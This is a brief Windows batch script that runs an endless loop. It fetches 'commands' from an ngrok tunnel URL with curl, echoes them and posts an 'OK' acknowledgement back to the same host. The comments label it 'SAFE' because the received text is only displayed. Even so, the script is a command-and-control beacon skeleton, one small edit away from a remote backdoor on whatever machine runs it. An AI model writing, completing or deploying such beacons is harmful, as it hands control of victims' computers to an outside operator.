@echo off
setlocal enabledelayedexpansion

set "URL=https://9a40b0bac7ee.ngrok-free.app"

:loop
    ping -n 1 127.0.0.1 >nul

    rem Get text from server (safe: only stores it)
    set "CMD="
    for /f "usebackq delims=" %%A in (`curl -s %URL%`) do (
        set "CMD=%%A"
    )

    if "!CMD!"=="" goto loop

    rem SAFE: only display it (not executed)
    echo Received: !CMD!

    rem (Optional) send reply back
    curl -X POST -d "OK" %URL% >nul

    goto loop
